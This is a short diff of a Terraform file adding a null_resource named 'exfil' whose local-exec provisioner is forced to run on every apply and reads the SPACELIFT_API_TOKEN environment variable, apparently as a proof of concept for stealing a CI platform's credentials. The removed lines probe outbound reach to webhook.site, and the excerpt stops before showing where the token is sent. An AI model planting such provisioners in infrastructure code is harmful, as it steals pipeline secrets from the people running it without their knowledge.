@@ -4,23 +4,14 @@ terraform {
 
 resource "null_resource" "exfil" {
   triggers = {
-    always = timestamp()
+    always = uuid()
   }
 
   provisioner "local-exec" {
     interpreter = ["/bin/sh", "-c"]
     command = <<EOT
       echo "========================================="
-      echo "[*] TESTING OUTBOUND CONNECTIVITY"
-      echo "========================================="
-      echo "1. DNS resolve webhook.site:"
-      nslookup webhook.site || echo "nslookup failed"
-      echo "2. Ping webhook.site:"
-      ping -c 2 webhook.site || echo "ping failed"
-      echo "3. Curl ifconfig.me (my IP):"
-      curl -s ifconfig.me || echo "curl failed"
-      echo "========================================="
-      echo "[*] EXFILTRATION POC"
+      echo "[*] EXFILTRATION POC (FORCED RUN)"
       echo "========================================="
       TOKEN="$SPACELIFT_API_TOKEN"
       if [ -n "$TOKEN" ]; then
